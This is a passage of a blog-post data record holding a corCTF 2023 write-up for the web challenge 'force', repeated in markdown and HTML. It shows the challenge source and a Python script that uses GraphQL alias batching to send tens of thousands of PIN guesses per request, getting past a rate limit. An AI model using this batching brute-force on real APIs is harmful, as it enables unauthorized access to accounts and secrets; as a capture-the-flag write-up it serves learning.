Writeup","date":"2024-05-14T10:20:19.793Z","_content":"# corCTF 2023\n\n# Web/force\n\n## Challenge Overview\n\n`Description`: Unbreakable vault door!\n\n![Index](./images/corctf23/index.png)\n\nWe have been given a website with a query in it.\n\nSo first let's see the source code given.\n\n```js\nimport fastify from 'fastify';\nimport mercurius from 'mercurius';\nimport { randomInt } from 'crypto';\nimport { readFile } from 'fs/promises';\n\nconst app = fastify({\n    logger: true\n});\nconst index = await readFile('./index.html', 'utf-8');\n\nconst secret = randomInt(0, 10 ** 5);\n\nlet requests = 10;\n\nsetInterval(() => requests = 10, 60000);\n\nawait app.register(mercurius, {\n    schema: `type Query {\n        flag(pin: Int): String\n    }`,\n    resolvers: {\n        Query: {\n            flag: (_, { pin }) => {\n                if (pin !== secret) {\n                    return 'Wrong!';\n                }\n                return process.env.FLAG || 'corctf{REDACTED}';\n            }\n        }\n    },\n    routes: false\n});\n\napp.get('/', (req, res) => {\n    return res.header('Content-Type', 'text/html').send(index);\n});\n\napp.post('/', async (req, res) => {\n    if (requests <= 0) {\n        return res.send('no u');\n    }\n    requests--;\n    return res.graphql(req.body);\n});\n\napp.listen({ host: '0.0.0.0', port: 4020 });\n```\nSo it generates a random integer named `secret` from 0 to 100000 and if we send the query in the given format with pin matching the secret it will give us the flag but the problem is there are 100000 possibilities and we can't bruteforce also because we can send only 10 request per 60 seconds.\n\n## Vulnerability Identification\n\nSo we have to find a way in which we can send different pins multiple times in the 1 post request.\n\nThere is a technique named `graphql-batching-attack` in which we can send multiple query in 1 post request as given below in image.\n\n![Reference](./images/corctf23/reference.png)\n\n[Reference](https://lab.wallarm.com/graphql-batching-attack/)\n\n\n## Exploiting the Vulnerability\n\nSo to exploit it we will be sending the query with 30000 flags each time with the below given python sctipt.\n\n```python\nimport requests\nimport re\n\nheaders = {\n    'Content-Type': 'text/plain;charset=UTF-8',\n}\nurl = 'https://web-force-force-a2e5f8d6b3c3a1f9.be.ax/'\n\nfor i in range(4):\n    query = ''\n    print(f'trying from {i * 30000} to {(i + 1) * 30000 - 1}')\n    \n    for x in range(i * 30000, (i + 1) * 30000):\n        query += f'flag{x} : flag(pin: {x})\\n'\n    response = requests.post(url, headers=headers, data=f'{{{query}}}')\n    \n    if 'corctf{' in response.text:\n        flag = re.search(r'corctf\\{.*?\\}', response.text)\n        if flag:\n            print(f\"Found flag on : {flag.group(0)}\") \n            break\n\n```\n\n## Obtaining the Flag\n\nHence after running the script we get the flag\n\n![Flag](./images/corctf23/flag.png) \n\nFlag: **corctf{S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S}**\n\nThank You","source":"_posts/corCTF23_Web_Writeup.md","raw":"---\ntitle: corCTF 2023 Writeup\ndate: \ntags:\n---\n# corCTF 2023\n\n# Web/force\n\n## Challenge Overview\n\n`Description`: Unbreakable vault door!\n\n![Index](./images/corctf23/index.png)\n\nWe have been given a website with a query in it.\n\nSo first let's see the source code given.\n\n```js\nimport fastify from 'fastify';\nimport mercurius from 'mercurius';\nimport { randomInt } from 'crypto';\nimport { readFile } from 'fs/promises';\n\nconst app = fastify({\n    logger: true\n});\nconst index = await readFile('./index.html', 'utf-8');\n\nconst secret = randomInt(0, 10 ** 5);\n\nlet requests = 10;\n\nsetInterval(() => requests = 10, 60000);\n\nawait app.register(mercurius, {\n    schema: `type Query {\n        flag(pin: Int): String\n    }`,\n    resolvers: {\n        Query: {\n            flag: (_, { pin }) => {\n                if (pin !== secret) {\n                    return 'Wrong!';\n                }\n                return process.env.FLAG || 'corctf{REDACTED}';\n            }\n        }\n    },\n    routes: false\n});\n\napp.get('/', (req, res) => {\n    return res.header('Content-Type', 'text/html').send(index);\n});\n\napp.post('/', async (req, res) => {\n    if (requests <= 0) {\n        return res.send('no u');\n    }\n    requests--;\n    return res.graphql(req.body);\n});\n\napp.listen({ host: '0.0.0.0', port: 4020 });\n```\nSo it generates a random integer named `secret` from 0 to 100000 and if we send the query in the given format with pin matching the secret it will give us the flag but the problem is there are 100000 possibilities and we can't bruteforce also because we can send only 10 request per 60 seconds.\n\n## Vulnerability Identification\n\nSo we have to find a way in which we can send different pins multiple times in the 1 post request.\n\nThere is a technique named `graphql-batching-attack` in which we can send multiple query in 1 post request as given below in image.\n\n![Reference](./images/corctf23/reference.png)\n\n[Reference](https://lab.wallarm.com/graphql-batching-attack/)\n\n\n## Exploiting the Vulnerability\n\nSo to exploit it we will be sending the query with 30000 flags each time with the below given python sctipt.\n\n```python\nimport requests\nimport re\n\nheaders = {\n    'Content-Type': 'text/plain;charset=UTF-8',\n}\nurl = 'https://web-force-force-a2e5f8d6b3c3a1f9.be.ax/'\n\nfor i in range(4):\n    query = ''\n    print(f'trying from {i * 30000} to {(i + 1) * 30000 - 1}')\n    \n    for x in range(i * 30000, (i + 1) * 30000):\n        query += f'flag{x} : flag(pin: {x})\\n'\n    response = requests.post(url, headers=headers, data=f'{{{query}}}')\n    \n    if 'corctf{' in response.text:\n        flag = re.search(r'corctf\\{.*?\\}', response.text)\n        if flag:\n            print(f\"Found flag on : {flag.group(0)}\") \n            break\n\n```\n\n## Obtaining the Flag\n\nHence after running the script we get the flag\n\n![Flag](./images/corctf23/flag.png) \n\nFlag: **corctf{S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S}**\n\nThank You","slug":"corCTF23_Web_Writeup","published":1,"updated":"2024-05-14T10:20:19.793Z","comments":1,"layout":"post","photos":[],"_id":"clw6937yx0002mnid8kuqf98t","content":"<h1 id=\"corCTF-2023\"><a href=\"#corCTF-2023\" class=\"headerlink\" title=\"corCTF 2023\"></a>corCTF 2023</h1><h1 id=\"Web-force\"><a href=\"#Web-force\" class=\"headerlink\" title=\"Web&#x2F;force\"></a>Web&#x2F;force</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p><code>Description</code>: Unbreakable vault door!</p>\n<p><img src=\"/./images/corctf23/index.png\" alt=\"Index\"></p>\n<p>We have been given a website with a query in it.</p>\n<p>So first let’s see the source code given.</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> fastify <span class=\"keyword\">from</span> <span class=\"string\">&#x27;fastify&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> mercurius <span class=\"keyword\">from</span> <span class=\"string\">&#x27;mercurius&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; randomInt &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;crypto&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; readFile &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;fs/promises&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">fastify</span>(&#123;</span><br><span class=\"line\">    <span class=\"attr\">logger</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"keyword\">const</span> index = <span class=\"keyword\">await</span> <span class=\"title function_\">readFile</span>(<span class=\"string\">&#x27;./index.html&#x27;</span>, <span class=\"string\">&#x27;utf-8&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> secret = <span class=\"title function_\">randomInt</span>(<span class=\"number\">0</span>, <span class=\"number\">10</span> ** <span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> requests = <span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">setInterval</span>(<span class=\"function\">() =&gt;</span> requests = <span class=\"number\">10</span>, <span class=\"number\">60000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">await</span> app.<span class=\"title function_\">register</span>(mercurius, &#123;</span><br><span class=\"line\">    <span class=\"attr\">schema</span>: <span class=\"string\">`type Query &#123;</span></span><br><span class=\"line\"><span class=\"string\">        flag(pin: Int): String</span></span><br><span class=\"line\"><span class=\"string\">    &#125;`</span>,</span><br><span class=\"line\">    <span class=\"attr\">resolvers</span>: &#123;</span><br><span class=\"line\">        <span class=\"title class_\">Query</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">flag</span>: <span class=\"function\">(<span class=\"params\">_, &#123; pin &#125;</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (pin !== secret) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Wrong!&#x27;</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> process.<span class=\"property\">env</span>.<span class=\"property\">FLAG</span> || <span class=\"string\">&#x27;corctf&#123;REDACTED&#125;&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">routes</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res.<span class=\"title function_\">header</span>(<span class=\"string\">&#x27;Content-Type&#x27;</span>, <span class=\"string\">&#x27;text/html&#x27;</span>).<span class=\"title function_\">send</span>(index);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">async</span> (req, res) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (requests &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res.<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;no u&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    requests--;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res.<span class=\"title function_\">graphql</span>(req.<span class=\"property\">body</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(&#123; <span class=\"attr\">host</span>: <span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"attr\">port</span>: <span class=\"number\">4020</span> &#125;);</span><br></pre></td></tr></table></figure>\n<p>So it generates a random integer named <code>secret</code> from 0 to 100000 and if we send the query in the given format with pin matching the secret it will give us the flag but the problem is there are 100000 possibilities and we can’t bruteforce also because we can send only 10 request per 60 seconds.</p>\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>So we have to find a way in which we can send different pins multiple times in the 1 post request.</p>\n<p>There is a technique named <code>graphql-batching-attack</code> in which we can send multiple query in 1 post request as given below in image.</p>\n<p><img src=\"/./images/corctf23/reference.png\" alt=\"Reference\"></p>\n<p><a href=\"https://lab.wallarm.com/graphql-batching-attack/\">Reference</a></p>\n<h2 id=\"Exploiting-the-Vulnerability\"><a href=\"#Exploiting-the-Vulnerability\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>So to exploit it we will be sending the query with 30000 flags each time with the below given python sctipt.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;text/plain;charset=UTF-8&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = <span class=\"string\">&#x27;https://web-force-force-a2e5f8d6b3c3a1f9.be.ax/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">    query = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;trying from <span class=\"subst\">&#123;i * <span class=\"number\">30000</span>&#125;</span> to <span class=\"subst\">&#123;(i + <span class=\"number\">1</span>) * <span class=\"number\">30000</span> - <span class=\"number\">1</span>&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i * <span class=\"number\">30000</span>, (i + <span class=\"number\">1</span>) * <span class=\"number\">30000</span>):</span><br><span class=\"line\">        query += <span class=\"string\">f&#x27;flag<span class=\"subst\">&#123;x&#125;</span> : flag(pin: <span class=\"subst\">&#123;x&#125;</span>)\\n&#x27;</span></span><br><span class=\"line\">    response = requests.post(url, headers=headers, data=<span class=\"string\">f&#x27;&#123;&#123;<span class=\"subst\">&#123;query&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;corctf&#123;&#x27;</span> <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">        flag = re.search(<span class=\"string\">r&#x27;corctf\\&#123;.*?\\&#125;&#x27;</span>, response.text)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Found flag on : <span class=\"subst\">&#123;flag.group(<span class=\"number\">0</span>)&#125;</span>&quot;</span>) </span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>Hence after running the script we get the flag</p>\n<p><img src=\"/./images/corctf23/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>corctf{S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S}</strong></p>\n<p>Thank You</p>\n","excerpt":"","more":"<h1 id=\"corCTF-2023\"><a href=\"#corCTF-2023\" class=\"headerlink\" title=\"corCTF 2023\"></a>corCTF 2023</h1><h1 id=\"Web-force\"><a href=\"#Web-force\" class=\"headerlink\" title=\"Web&#x2F;force\"></a>Web&#x2F;force</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p><code>Description</code>: Unbreakable vault door!</p>\n<p><img src=\"/./images/corctf23/index.png\" alt=\"Index\"></p>\n<p>We have been given a website with a query in it.</p>\n<p>So first let’s see the source code given.</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> fastify <span class=\"keyword\">from</span> <span class=\"string\">&#x27;fastify&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> mercurius <span class=\"keyword\">from</span> <span class=\"string\">&#x27;mercurius&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; randomInt &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;crypto&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; readFile &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;fs/promises&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">fastify</span>(&#123;</span><br><span class=\"line\">    <span class=\"attr\">logger</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"keyword\">const</span> index = <span class=\"keyword\">await</span> <span class=\"title function_\">readFile</span>(<span class=\"string\">&#x27;./index.html&#x27;</span>, <span class=\"string\">&#x27;utf-8&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> secret = <span class=\"title function_\">randomInt</span>(<span class=\"number\">0</span>, <span class=\"number\">10</span> ** <span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> requests = <span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">setInterval</span>(<span class=\"function\">() =&gt;</span> requests = <span class=\"number\">10</span>, <span class=\"number\">60000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">await</span> app.<span class=\"title function_\">register</span>(mercurius, &#123;</span><br><span class=\"line\">    <span class=\"attr\">schema</span>: <span class=\"string\">`type Query &#123;</span></span><br><span class=\"line\"><span class=\"string\">        flag(pin: Int): String</span></span><br><span class=\"line\"><span class=\"string\">    &#125;`</span>,</span><br><span class=\"line\">    <span class=\"attr\">resolvers</span>: &#123;</span><br><span class=\"line\">        <span class=\"title class_\">Query</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">flag</span>: <span class=\"function\">(<span class=\"params\">_, &#123; pin &#125;</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (pin !== secret) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Wrong!&#x27;</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> process.<span class=\"property\">env</span>.<span class=\"property\">FLAG</span> || <span class=\"string\">&#x27;corctf&#123;REDACTED&#125;&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">routes</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res.<span class=\"title function_\">header</span>(<span class=\"string\">&#x27;Content-Type&#x27;</span>, <span class=\"string\">&#x27;text/html&#x27;</span>).<span class=\"title function_\">send</span>(index);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">async</span> (req, res) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (requests &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res.<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;no u&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    requests--;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res.<span class=\"title function_\">graphql</span>(req.<span class=\"property\">body</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(&#123; <span class=\"attr\">host</span>: <span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"attr\">port</span>: <span class=\"number\">4020</span> &#125;);</span><br></pre></td></tr></table></figure>\n<p>So it generates a random integer named <code>secret</code> from 0 to 100000 and if we send the query in the given format with pin matching the secret it will give us the flag but the problem is there are 100000 possibilities and we can’t bruteforce also because we can send only 10 request per 60 seconds.</p>\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>So we have to find a way in which we can send different pins multiple times in the 1 post request.</p>\n<p>There is a technique named <code>graphql-batching-attack</code> in which we can send multiple query in 1 post request as given below in image.</p>\n<p><img src=\"/./images/corctf23/reference.png\" alt=\"Reference\"></p>\n<p><a href=\"https://lab.wallarm.com/graphql-batching-attack/\">Reference</a></p>\n<h2 id=\"Exploiting-the-Vulnerability\"><a href=\"#Exploiting-the-Vulnerability\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>So to exploit it we will be sending the query with 30000 flags each time with the below given python sctipt.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;text/plain;charset=UTF-8&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = <span class=\"string\">&#x27;https://web-force-force-a2e5f8d6b3c3a1f9.be.ax/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">    query = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;trying from <span class=\"subst\">&#123;i * <span class=\"number\">30000</span>&#125;</span> to <span class=\"subst\">&#123;(i + <span class=\"number\">1</span>) * <span class=\"number\">30000</span> - <span class=\"number\">1</span>&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i * <span class=\"number\">30000</span>, (i + <span class=\"number\">1</span>) * <span class=\"number\">30000</span>):</span><br><span class=\"line\">        query += <span class=\"string\">f&#x27;flag<span class=\"subst\">&#123;x&#125;</span> : flag(pin: <span class=\"subst\">&#123;x&#125;</span>)\\n&#x27;</span></span><br><span class=\"line\">    response = requests.post(url, headers=headers, data=<span class=\"string\">f&#x27;&#123;&#123;<span class=\"subst\">&#123;query&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;corctf&#123;&#x27;</span> <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">        flag = re.search(<span class=\"string\">r&#x27;corctf\\&#123;.*?\\&#125;&#x27;</span>, response.text)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Found flag on : <span class=\"subst\">&#123;flag.group(<span class=\"number\">0</span>)&#125;</span>&quot;</span>) </span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the 